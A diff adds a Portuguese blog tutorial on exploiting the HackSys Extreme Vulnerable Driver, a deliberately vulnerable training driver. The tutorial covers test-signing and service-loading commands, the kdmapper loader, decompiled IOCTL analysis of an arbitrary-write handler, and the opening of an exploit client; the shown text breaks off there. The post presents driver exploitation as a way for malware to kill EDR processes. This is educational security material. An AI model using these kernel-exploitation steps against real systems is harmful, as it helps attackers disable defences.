@@ -1,0 +1,921 @@
+<!DOCTYPE html><html lang="en" class="dark" data-astro-cid-jj6gr7j4> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Vithor | HackSys Extreme Vulnerable Driver</title><meta name="title" content="Vithor | HackSys Extreme Vulnerable Driver"><meta name="description" content="Uma introdução prática ao HackSys Extreme Vulnerable Driver (HEVD), com análise de IOCTLs, Arbitrary Write e exploração no kernel do Windows."><link rel="stylesheet" href="/assets/fonts.css"><link rel="stylesheet" href="/assets/about-2.css"><link rel="stylesheet" href="/assets/_slug_.css"><script>
+      const theme = (() => {
+        if (typeof localStorage !== "undefined" && localStorage.getItem("theme")) {
+          return localStorage.getItem("theme");
+        }
+        return "dark";
+      })();
+
+      if (theme === "light") document.documentElement.classList.remove("dark");
+      else document.documentElement.classList.add("dark");
+    </script><link rel="stylesheet" href="/_astro/_slug_@_@astro.BjJ6NIIH.css"></head> <body class="font-sans antialiased min-h-screen bg-gray-100 dark:bg-[#0f0f0f]" data-astro-cid-ylc345xr> <div class="site-single-outer" data-astro-cid-ylc345xr> <article class="site-single" data-astro-cid-ylc345xr> <div class="single-topbar" data-astro-cid-ylc345xr> <a href="javascript:history.back()" class="back-link" data-astro-cid-ylc345xr>← Back</a> <div class="single-topbar__right">  <button type="button" id="theme-toggle-single" aria-label="Toggle theme"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <circle cx="12" cy="12" r="5"></circle> <line x1="12" y1="1" x2="12" y2="3"></line> <line x1="12" y1="21" x2="12" y2="23"></line> <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line> <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line> <line x1="1" y1="12" x2="3" y2="12"></line> <line x1="21" y1="12" x2="23" y2="12"></line> <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line> <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line> </svg> </button> </div> </div> <div class="ruler-scrollbar svelte-xengn3" style="height: clamp(400px, 60vh, 85vh);"> <div class="ruler-track svelte-xengn3"></div> <div class="ruler-indicator svelte-xengn3" style="top: 0%;"> <span class="ruler-value svelte-xengn3">0.00</span> <div class="ruler-pointer svelte-xengn3"></div> </div> </div> <button class="toc-toggle svelte-1r6e6jk" aria-label="Toggle Table of Contents"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"> <line x1="5" y1="7" x2="19" y2="7"></line> <line x1="5" y1="12" x2="19" y2="12"></line> <line x1="5" y1="17" x2="19" y2="17"></line> </svg> </button> <div class="toc-overlay svelte-1r6e6jk" style="display: none;"></div> <div class="toc-sidebar svelte-1r6e6jk"> <div class="toc-header svelte-1r6e6jk"> <span class="toc-title svelte-1r6e6jk">Table of contents</span> <button class="close-btn svelte-1r6e6jk" aria-label="Close menu"> <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <line x1="18" y1="6" x2="6" y2="18"></line> <line x1="6" y1="6" x2="18" y2="18"></line> </svg> </button> </div> <div class="toc-content svelte-1r6e6jk"></div> <div class="toc-footer svelte-1r6e6jk"> <button class="action-btn text-primary svelte-1r6e6jk" data-action="expand">Expand all</button> <button class="action-btn svelte-1r6e6jk" data-action="collapse">Collapse all</button> <div class="h-divider svelte-1r6e6jk"></div> <button class="action-btn svelte-1r6e6jk" data-action="top">Back to top</button> <button class="action-btn svelte-1r6e6jk" data-action="bottom">Go to bottom</button> </div> </div> <div class="post__header" data-astro-cid-jj6gr7j4> <div class="post__tags" data-astro-cid-jj6gr7j4> <a class="post__tag" href="/blog" title="Exploit Development" data-astro-cid-jj6gr7j4>Exploit Development</a><a class="post__tag" href="/blog" title="Windows Kernel" data-astro-cid-jj6gr7j4>Windows Kernel</a><a class="post__tag" href="/blog" title="BYOVD" data-astro-cid-jj6gr7j4>BYOVD</a> </div> <h1 class="post__title" data-astro-cid-jj6gr7j4>HackSys Extreme Vulnerable Driver</h1> <h5 class="post__desc" data-astro-cid-jj6gr7j4> <a class="post__author" href="https://x.com/m3mdump" target="_blank" rel="external" data-astro-cid-jj6gr7j4>Vithor</a>
+&nbsp;|&nbsp;
+<span class="post__date" data-astro-cid-jj6gr7j4>Monday, December 15, 2025</span> 
+&nbsp;|&nbsp;
+<span class="post__stats" data-astro-cid-jj6gr7j4>22 min read</span>  </h5> </div> <article class="prose dark:prose-invert text-justify hyphens-auto" data-astro-cid-apjhz64k>  <p>Percebi que, mesmo depois de tantos posts, eu nunca tinha falado sobre <strong>drivers no Windows</strong>. Então decidi iniciar uma pequena série sobre o assunto. E nada melhor para começar do que apresentar um dos projetos mais clássicos quando falamos de exploração de vulnerabilidades em drivers: o <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver"><strong>HackSys Extreme Vulnerable Driver (HEVD)</strong></a>.</p>
+<p>Vale lembrar que já existem vários blogs que analisam profundamente as vulnerabilidades desse driver. No próprio repositório do projeto você encontra links para materiais que explicam como explorar diferentes tipos de falhas.</p>
+<p>Ainda assim, resolvi escrever um post simples sobre o tema. Portanto, se você está buscando um estudo mais avançado ou detalhado, este post talvez não seja para você, minha intenção aqui é trazer uma visão mais direta e acessível.</p>
+<p><strong>WARNING:</strong> As informações que você encontrar neste post, técnicas, códigos, provas de conceito ou qualquer outra coisa são estritamente para fins educacionais.</p>
+<hr>
+<h2 id="introdução">Introdução<a aria-hidden="true" tabindex="-1" href="#introdução"><span class="icon icon-link"></span></a></h2>
+<p>Provavelmente você já ouviu o termo <strong>Bring Your Own Vulnerable Driver (BYOVD)</strong>, mas caso nunca tenha ouvido falar, trata-se de carregar um driver vulnerável para explorar falhas no kernel.</p>
+<p>Explorar um driver vulnerável é algo muito interessante no contexto de desenvolvimento de malware, pois permite eliminar processos de EDR, modificar estruturas de dados do kernel das quais os EDRs dependem para coletar telemetria e muito mais. Também é uma técnica amplamente utilizada por desenvolvedores de cheats de jogos.</p>
+<hr>
+<h3 id="driver-installation">Driver Installation<a aria-hidden="true" tabindex="-1" href="#driver-installation"><span class="icon icon-link"></span></a></h3>
+<p>Para conseguir executar o driver <strong>HEVD.sys</strong>, você vai precisar ativar o modo de teste no Windows. Você pode fazer isso iniciando um <strong>CMD</strong> como administrador e executando os seguintes comandos:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bat"><code><span class="line"><span style="color:#F97583">bcdedit</span><span style="color:#E1E4E8"> /set testsigning on</span></span>
+<span class="line"><span style="color:#F97583">shutdown</span><span style="color:#E1E4E8"> /r /t </span><span style="color:#79B8FF">0</span></span></code></pre>
+<p><strong>INFO:</strong> Vale lembrar que você também pode utilizar o <a href="https://github.com/TheCruZ/kdmapper">kdmapper</a>, que consegue mapear o driver na memória do kernel sem a necessidade de um certificado ou de modificar as configurações de inicialização.</p>
+<hr>
+<h3 id="registrar-serviço">Registrar Serviço<a aria-hidden="true" tabindex="-1" href="#registrar-serviço"><span class="icon icon-link"></span></a></h3>
+<p>O próximo passo é registrar o serviço do driver e inicializá-lo. Você pode fazer isso utilizando o <a href="https://www.osronline.com/article.cfm%5Earticle=157.htm">OSR Driver Loader</a> ou simplesmente executando os seguintes comandos no <strong>CMD</strong> para registrar um serviço e inicializá-lo:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bat"><code><span class="line"><span style="color:#F97583">sc</span><span style="color:#E1E4E8"> create HEVD type= kernel start= demand binPath= </span><span style="color:#9ECBFF">"C:\caminho\para\HEVD.sys"</span></span>
+<span class="line"><span style="color:#F97583">sc</span><span style="color:#F97583"> start</span><span style="color:#E1E4E8"> HEVD</span></span>
+<span class="line"><span style="color:#F97583">sc</span><span style="color:#F97583"> query</span><span style="color:#E1E4E8"> HEVD</span></span></code></pre>
+<h2 id="análise-estática">Análise Estática<a aria-hidden="true" tabindex="-1" href="#análise-estática"><span class="icon icon-link"></span></a></h2>
+<p>Como estamos lidando com um driver vulnerável, o principal objetivo é fazer engenharia reversa e descobrir manipuladores de <strong>IOCTL</strong> que tenham sido implementados de forma insegura. Então, o que são IOCTLs?</p>
+<p><strong>IOCTL (Input Output Control Codes)</strong> IOCTLs são códigos de controle enviados a drivers para instruí-los a realizar operações específicas. Cada driver define seu próprio conjunto de IOCTLs, que são processados em suas rotinas de despacho. Quando esses manipuladores não validam corretamente os dados recebidos, podem surgir falhas que tornam o driver vulnerável.</p>
+<p>Da mesma forma, é importante entender também o papel dos IRPs:</p>
+<p><strong>IRP (I/O Request Packets)</strong> IRPs são estruturas usadas pelo Windows para transmitir solicitações, como leitura, escrita ou comandos de controle, entre o sistema operacional e os drivers. Cada <strong>IOCTL</strong> gera um <strong>IRP</strong>, que é tratado pela rotina <strong>DispatchDeviceControl</strong> do driver. Quando o processamento desses <strong>IRPs</strong> é feito de maneira inadequada, pode ocorrer comportamento incorreto no driver, incluindo problemas de integridade de memória ou de controle de acesso.</p>
+<hr>
+<h3 id="análise-do-driver">Análise do Driver<a aria-hidden="true" tabindex="-1" href="#análise-do-driver"><span class="icon icon-link"></span></a></h3>
+<p>Então, para começar a análise do driver, vamos carregá-lo no IDA.</p>
+<p>![[Pasted image 20260422174950.png]]</p>
+<p>O próximo passo é localizar os <strong>IOCTLs</strong> implementados no driver, que podem ser encontrados na função <code>**sub_140085078**</code><strong>.</strong></p>
+<p>![[Pasted image 20260422174957.png]]</p>
+<p>O principal objetivo agora é analisar o manipulador relacionado ao: <code>HEVD_IOCTL_ARBITRARY_WRITE</code> para isso, vamos observá-lo com mais atenção. Já sabemos que o IOCTL correspondente é: <code>0x22200Bu</code></p>
+<p>Seguindo no IDA, entramos na função <code>**sub_140085E58**</code>, onde encontramos o seguinte**:**</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#E1E4E8">__int64 __fastcall </span><span style="color:#B392F0">sub_140085E58</span><span style="color:#E1E4E8">(__int64 </span><span style="color:#FFAB70">a1</span><span style="color:#E1E4E8">, __int64 </span><span style="color:#FFAB70">a2</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">{</span></span>
+<span class="line"><span style="color:#E1E4E8">  __int64 result;</span><span style="color:#6A737D"> // rax</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">  result </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 3221225473</span><span style="color:#F97583">LL</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">  if</span><span style="color:#E1E4E8"> ( </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">(_QWORD </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)(a2 </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 32</span><span style="color:#E1E4E8">) )</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#B392F0"> sub_140085E74</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#F97583">  return</span><span style="color:#E1E4E8"> result;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>A função <code>**sub_140085E58**</code> basicamente verifica um campo dentro da estrutura do <strong>IRP</strong> e, se ele for válido, redireciona o processamento para <code>**sub_140085E74,**</code> caso contrário, apenas retorna um código de erro padrão.</p>
+<p>Como esse redirecionamento ocorre quando a condição é atendida, o próximo passo da análise é justamente entender o que acontece dentro de <code>**sub_140085E74**</code>.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#E1E4E8">__int64 __fastcall </span><span style="color:#B392F0">sub_140085E74</span><span style="color:#E1E4E8">(_QWORD </span><span style="color:#F97583">**</span><span style="color:#FFAB70">a1</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">{</span></span>
+<span class="line"><span style="color:#E1E4E8">  _QWORD </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">v2;</span><span style="color:#6A737D"> // rbx</span></span>
+<span class="line"><span style="color:#E1E4E8">  _QWORD </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">v3;</span><span style="color:#6A737D"> // rdi</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">  ProbeForRead</span><span style="color:#E1E4E8">(a1, </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">10</span><span style="color:#F97583">u</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">1</span><span style="color:#F97583">u</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">  v2 </span><span style="color:#F97583">=</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">a1;</span></span>
+<span class="line"><span style="color:#E1E4E8">  v3 </span><span style="color:#F97583">=</span><span style="color:#FFAB70"> a1</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#B392F0">  DbgPrintEx</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">4D</span><span style="color:#F97583">u</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">3</span><span style="color:#F97583">u</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"[+] UserWriteWhatWhere: 0x</span><span style="color:#79B8FF">%p\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, a1);</span></span>
+<span class="line"><span style="color:#B392F0">  DbgPrintEx</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">4D</span><span style="color:#F97583">u</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">3</span><span style="color:#F97583">u</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"[+] WRITE_WHAT_WHERE Size: 0x</span><span style="color:#79B8FF">%X\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">16</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">  DbgPrintEx</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">4D</span><span style="color:#F97583">u</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">3</span><span style="color:#F97583">u</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"[+] UserWriteWhatWhere->What: 0x</span><span style="color:#79B8FF">%p\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, v2);</span></span>
+<span class="line"><span style="color:#B392F0">  DbgPrintEx</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">4D</span><span style="color:#F97583">u</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">3</span><span style="color:#F97583">u</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"[+] UserWriteWhatWhere->Where: 0x</span><span style="color:#79B8FF">%p\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, v3);</span></span>
+<span class="line"><span style="color:#B392F0">  DbgPrintEx</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">4D</span><span style="color:#F97583">u</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">3</span><span style="color:#F97583">u</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"[+] Triggering Arbitrary Write</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">  *</span><span style="color:#E1E4E8">v3 </span><span style="color:#F97583">=</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">v2;</span></span>
+<span class="line"><span style="color:#F97583">  return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>Temos que tentar entender essa função imaginando que os prints não existem, para que possamos realmente aprender o que ela faz. A função <code>**sub_140085E74**</code> recebe como argumento um ponteiro para um array de dois ponteiros <code>_QWORD **a1</code>.</p>
+<p>Logo no início, ela chama <code>ProbeForRead(a1, 0x10u, 1u)</code>, o que indica que o driver espera que <code>a1</code> aponte para uma estrutura de pelo menos <strong>16 bytes</strong> <strong>(0x10)</strong>, contendo dois endereços de 8 bytes cada.</p>
+<p>Depois dessa verificação, o código faz:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>v2 = *a1;</span></span>
+<span class="line"><span>v3 = a1[1];</span></span></code></pre>
+<p>Isso já nos diz algo muito importante: <strong>a função está tratando</strong> <code>**a1**</code> <strong>como um array de dois ponteiros fornecidos pelo usuário.</strong></p>
+<p>Em seguida, ela executa:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#F97583">*</span><span style="color:#E1E4E8">v3 </span><span style="color:#F97583">=</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8">v2;</span></span></code></pre>
+<p>Aqui está o comportamento essencial:</p>
+<ul>
+<li>
+<p>A função lê um valor do endereço apontado por <code>v2</code>.</p>
+</li>
+<li>
+<p>E escreve esse valor no endereço apontado por <code>v3</code>.</p>
+</li>
+</ul>
+<p>Mesmo que não existisse print ou comentário, essa operação deixa claro que a função copia dados de um endereço para outro, diretamente na memória.</p>
+<p>Para entender de fato como os ponteiros <code>v2</code> e <code>v3</code> chegam até <code>**sub_140085E74**</code>, precisamos voltar para a função que chama <code>**sub_140085E58**</code>, que é o trecho responsável por tratar o <strong>IOCTL</strong> <code>**0x22200B**</code>:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#E1E4E8">case </span><span style="color:#F97583">0x</span><span style="color:#79B8FF">22200B</span><span style="color:#F97583">u</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#B392F0">    DbgPrintEx</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">4D</span><span style="color:#F97583">u</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">3</span><span style="color:#F97583">u</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"****** HEVD_IOCTL_ARBITRARY_WRITE ******</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    v6 </span><span style="color:#F97583">=</span><span style="color:#B392F0"> sub_140085E58</span><span style="color:#E1E4E8">(a2, CurrentStackLocation);</span></span>
+<span class="line"><span style="color:#E1E4E8">    v7 </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "****** HEVD_IOCTL_ARBITRARY_WRITE ******</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">    goto</span><span style="color:#E1E4E8"> LABEL_62;</span></span></code></pre>
+<p>Aqui podemos ver que, quando o IOCTL correto é identificado, o driver:</p>
+<ol>
+<li>
+<p>Recebe o IRP (no <code>CurrentStackLocation</code>).</p>
+</li>
+<li>
+<p>Passa esse IRP para <code>**sub_140085E58**</code>, que faz a verificação inicial e possivelmente chama <code>**sub_140085E74**</code>.</p>
+</li>
+</ol>
+<p>Com isso, o próximo foco da análise passa a ser como <code>CurrentStackLocation</code> é construído, ou seja, como os dados enviados pelo usuário chegam até a função vulnerável responsável pela escrita arbitrária.</p>
+<p>Para entender esse fluxo, voltamos ao início da função <code>sub_140085078</code>, que atua como o <strong>handler</strong> principal dos <strong>IOCTLs</strong> do driver.</p>
+<p>Ao observar o começo da função, encontramos o seguinte:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#E1E4E8">__int64 __fastcall </span><span style="color:#B392F0">sub_140085078</span><span style="color:#E1E4E8">(__int64 </span><span style="color:#FFAB70">a1</span><span style="color:#E1E4E8">, IRP </span><span style="color:#F97583">*</span><span style="color:#FFAB70">a2</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">{</span></span>
+<span class="line"><span style="color:#F97583">  struct</span><span style="color:#E1E4E8"> _IO_STACK_LOCATION </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">CurrentStackLocation;</span><span style="color:#6A737D"> // r14</span></span>
+<span class="line"><span style="color:#F97583">  unsigned</span><span style="color:#F97583"> int</span><span style="color:#E1E4E8"> v4;</span><span style="color:#6A737D"> // esi</span></span>
+<span class="line"><span style="color:#F97583">  unsigned</span><span style="color:#F97583"> int</span><span style="color:#E1E4E8"> LowPart;</span><span style="color:#6A737D"> // r9d</span></span>
+<span class="line"><span style="color:#F97583">  unsigned</span><span style="color:#F97583"> int</span><span style="color:#E1E4E8"> v6;</span><span style="color:#6A737D"> // eax</span></span>
+<span class="line"><span style="color:#F97583">  const</span><span style="color:#E1E4E8"> CHAR </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">v7;</span><span style="color:#6A737D"> // r8</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">  CurrentStackLocation </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> a2->Tail.Overlay.CurrentStackLocation;</span></span>
+<span class="line"><span style="color:#E1E4E8">  v4 </span><span style="color:#F97583">=</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">1073741637</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">  if</span><span style="color:#E1E4E8"> ( CurrentStackLocation )</span></span>
+<span class="line"><span style="color:#E1E4E8">  {</span></span>
+<span class="line"><span style="color:#E1E4E8">    LowPart </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> CurrentStackLocation->Parameters.Read.ByteOffset.LowPart;</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> ( LowPart </span><span style="color:#F97583">></span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">22203B</span><span style="color:#E1E4E8"> )</span></span>
+<span class="line"><span style="color:#E1E4E8">    {</span></span>
+<span class="line"><span style="color:#F97583">      if</span><span style="color:#E1E4E8"> ( LowPart </span><span style="color:#F97583">></span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">222057</span><span style="color:#E1E4E8"> )</span></span>
+<span class="line"><span style="color:#E1E4E8">      {</span></span>
+<span class="line"><span style="color:#F97583">        switch</span><span style="color:#E1E4E8"> ( LowPart )</span></span>
+<span class="line"><span style="color:#E1E4E8">        {</span></span>
+<span class="line"><span style="color:#F97583">          case</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">22205B</span><span style="color:#F97583">u</span><span style="color:#E1E4E8">:</span></span></code></pre>
+<p>Aqui podemos ver que a função recebe como argumentos um <code>DeviceObject</code> (representado por <code>a1</code>) e um ponteiro para um <code>IRP</code> (<code>a2</code>), exatamente como uma rotina de dispatch esperada em um driver do Windows.</p>
+<p>Agora vamos olhar para essa linha:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#E1E4E8">CurrentStackLocation </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> a2</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">Tail.Overlay.CurrentStackLocation;</span></span></code></pre>
+<p>Antes de tudo, é importante entender o que é o <code>CurrentStackLocation</code>. <code>CurrentStackLocation</code> é a estrutura <code>_IO_STACK_LOCATION</code> associada ao <strong>IRP</strong> que o driver está processando. Sempre que um processo em modo usuário chama <code>DeviceIoControl</code>, o Windows preenche essa estrutura com os parâmetros da requisição.</p>
+<p>Então a expressão <code>a2->Tail.Overlay.CurrentStackLocation</code> simplesmente acessa o campo onde o Windows guarda o stack location atual. Ou seja:</p>
+<p><code>CurrentStackLocation</code> passa a apontar para a parte do <strong>IRP</strong> onde estão os dados enviados pelo usuário.</p>
+<p>Com esse ponteiro em mãos, o driver consegue ver qual <strong>IOCTL</strong> foi solicitado. Isso acontece logo na linha seguinte:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#E1E4E8">LowPart </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> CurrentStackLocation</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">Parameters.Read.</span><span style="color:#79B8FF">ByteOffset</span><span style="color:#E1E4E8">.LowPart;</span></span></code></pre>
+<p>O HEVD reutiliza esse campo (<code>LowPart</code>) para armazenar o código <strong>IOCTL</strong>, Portanto:</p>
+<ul>
+<li><code>LowPart</code> é o IOCTL que o processo em modo usuário enviou.</li>
+</ul>
+<p>Depois disso, o driver compara esse valor com alguns limites e finalmente entra no <code>switch</code>, onde cada case corresponde a um <strong>IOCTL</strong> específico.</p>
+<p>É dessa forma que o IOCTL <code>0x22200B</code> acaba sendo direcionado para o manipulador vulnerável responsável pela escrita arbitrária.</p>
+<hr>
+<h2 id="escrevendo-exploit">Escrevendo exploit<a aria-hidden="true" tabindex="-1" href="#escrevendo-exploit"><span class="icon icon-link"></span></a></h2>
+<p>Agora que entendemos melhor o funcionamento interno do driver, podemos começar a desenvolver o nosso exploit.</p>
+<p>O primeiro passo é simples: <strong>estabelecer uma conexão com o driver vulnerável</strong> para que possamos enviar <strong>IOCTLs</strong> e interagir diretamente com ele.</p>
+<p>Para isso, criamos uma classe responsável por abrir o handler do dispositivo:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#E1E4E8">class MemoryTester {</span></span>
+<span class="line"><span style="color:#E1E4E8">private:</span></span>
+<span class="line"><span style="color:#E1E4E8">    HANDLE hDevice;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">public:</span></span>
+<span class="line"><span style="color:#B392F0">    MemoryTester</span><span style="color:#E1E4E8">() : </span><span style="color:#B392F0">hDevice</span><span style="color:#E1E4E8">(INVALID_HANDLE_VALUE) {}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">    BOOL </span><span style="color:#B392F0">Initialize</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#E1E4E8">        hDevice </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateFileW</span><span style="color:#E1E4E8">(</span></span>
+<span class="line"><span style="color:#E1E4E8">            L</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\\\\</span><span style="color:#9ECBFF">.</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">HackSysExtremeVulnerableDriver"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">            GENERIC_READ </span><span style="color:#F97583">|</span><span style="color:#E1E4E8"> GENERIC_WRITE,</span></span>
+<span class="line"><span style="color:#E1E4E8">            FILE_SHARE_READ </span><span style="color:#F97583">|</span><span style="color:#E1E4E8"> FILE_SHARE_WRITE,</span></span>
+<span class="line"><span style="color:#79B8FF">            NULL</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">            OPEN_EXISTING,</span></span>
+<span class="line"><span style="color:#E1E4E8">            FILE_ATTRIBUTE_NORMAL,</span></span>
+<span class="line"><span style="color:#79B8FF">            NULL</span></span>
+<span class="line"><span style="color:#E1E4E8">        );</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (hDevice </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> INVALID_HANDLE_VALUE) {</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Falha ao abrir handle do dispositivo: </span><span style="color:#79B8FF">%d\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">GetLastError</span><span style="color:#E1E4E8">());</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#F97583">        else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Handle do dispositivo aberto com sucesso</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> hDevice </span><span style="color:#F97583">!=</span><span style="color:#E1E4E8"> INVALID_HANDLE_VALUE;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">};</span></span></code></pre>
+<p>Essa rotina utiliza <code>CreateFileW</code> para abrir o símbolo de dispositivo exposto pelo driver (<code>\\.\HackSysExtremeVulnerableDriver</code>).</p>
